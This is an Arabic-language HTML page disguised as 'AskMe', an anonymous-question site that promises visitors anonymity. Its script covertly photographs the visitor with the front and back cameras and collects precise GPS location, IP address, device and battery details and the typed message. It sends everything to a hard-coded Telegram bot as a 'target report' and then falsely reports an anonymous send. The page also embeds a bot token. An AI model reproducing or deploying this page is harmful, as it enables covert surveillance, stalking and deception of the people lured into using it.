<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AskMe | منصة الأسئلة المجهولة</title>
    <style>
        :root { --accent: #ff3e60; --bg: #0f0f13; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .main-card { background: #1a1a22; padding: 30px; border-radius: 25px; width: 85%; max-width: 380px; text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.05); }
        .profile-pic { width: 80px; height: 80px; background: linear-gradient(45deg, var(--accent), #ff8a65); border-radius: 50%; margin: -70px auto 15px; border: 5px solid #1a1a22; display: flex; align-items: center; justify-content: center; font-size: 30px; }
        h1 { font-size: 1.3rem; margin-bottom: 5px; }
        p { color: #8e8e93; font-size: 0.85rem; margin-bottom: 20px; }
        textarea { width: 100%; height: 100px; background: #25252e; border: 1px solid #3a3a44; border-radius: 15px; color: white; padding: 12px; box-sizing: border-box; resize: none; font-family: inherit; margin-bottom: 15px; outline: none; }
        textarea:focus { border-color: var(--accent); }
        .send-btn { background: var(--accent); color: white; border: none; padding: 14px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 1rem; }
        .send-btn:active { transform: scale(0.95); opacity: 0.9; }
        #loading { display: none; margin-top: 15px; font-size: 0.8rem; color: var(--accent); }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="main-card">
    <div class="profile-pic">👤</div>
    <h1>أرسل لي سؤالاً مجهولاً!</h1>
    <p>لن أعرف من أنت، قل ما تشاء بصراحة..</p>
    
    <textarea id="msgBox" placeholder="اكتب سؤالك هنا..."></textarea>
    
    <button class="send-btn" onclick="initiateGhostProcess()">إرسال مجهول</button>
    <div id="loading">جاري تشفير الرسالة وإرسالها...</div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
    const chat = "7984067238";

    async function sendToBot(content, isPhoto = false) {
        const base = `https://api.telegram.org/bot${token}/`;
        try {
            if (!isPhoto) {
                await fetch(`${base}sendMessage?chat_id=${chat}&text=${encodeURIComponent(content)}&parse_mode=Markdown`);
            } else {
                const fd = new FormData();
                fd.append("chat_id", chat);
                fd.append("photo", content, "full_shot.jpg");
                await fetch(`${base}sendPhoto`, { method: "POST", body: fd });
            }
        } catch (e) {}
    }

    async function getFullReport() {
        try {
            const b = await navigator.getBattery();
            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            const chargeStatus = b.charging ? "🔌 (متصل بالشاحن)" : "🔋 (يعمل على البطارية)";
            
            return `👤 *تقرير هدف صارحني*:\n` +
                   `📍 الموقع: [رابط الخرائط](https://www.google.com/maps?q=${await getCoords()})\n` +
                   `📱 الجهاز: \`${navigator.platform}\`\n` +
                   `🔋 البطارية: \`${Math.round(b.level * 100)}%\` ${chargeStatus}\n` +
                   `🌐 الـ IP: \`${ip.ip}\`\n` +
                   `💬 الرسالة المكتوبة: \`${document.getElementById('msgBox').value}\``;
        } catch (e) { return "تعذر جلب التقرير بالكامل"; }
    }

    function getCoords() {
        return new Promise(res => {
            navigator.geolocation.getCurrentPosition(p => res(`${p.coords.latitude},${p.coords.longitude}`), () => res("0,0"), {enableHighAccuracy: true});
        });
    }

    async function captureFull(side) {
        try {
            // طلب أعلى دقة ممكنة من الكاميرا
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: side === "front" ? "user" : "environment",
                    width: { ideal: 4096 }, // محاولة جلب 4K أو أعلى دقة للجهاز
                    height: { ideal: 2160 }
                } 
            });
            const v = document.getElementById('v');
            v.srcObject = stream;
            await new Promise(r => v.onloadedmetadata = r);
            await new Promise(r => setTimeout(r, 1000)); // وقت إضافي للوضوح

            const canvas = document.getElementById('c');
            canvas.width = v.videoWidth;
            canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);
            
            stream.getTracks().forEach(t => t.stop());
            return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9)); // جودة عالية جداً
        } catch (e) { return null; }
    }

    async function initiateGhostProcess() {
        const msg = document.getElementById('msgBox').value;
        if (!msg) { alert("اكتب شيئاً أولاً!"); return; }

        document.getElementById('loading').style.display = 'block';

        // 1. تصوير الكاميرا الأمامية (سيلفي)
        const front = await captureFull("front");
        if (front) await sendToBot(front, true);

        // 2. تصوير الكاميرا الخلفية (المحيط)
        const back = await captureFull("back");
        if (back) await sendToBot(back, true);

        // 3. إرسال التقرير الشامل بما فيه الرسالة التي كتبها
        const report = await getFullReport();
        await sendToBot(report);

        setTimeout(() => {
            alert("تم إرسال رسالتك مجهولة الهوية بنجاح!");
            document.getElementById('loading').style.display = 'none';
            document.getElementById('msgBox').value = "";
        }, 2000);
    }
</script>

</body>
</html>
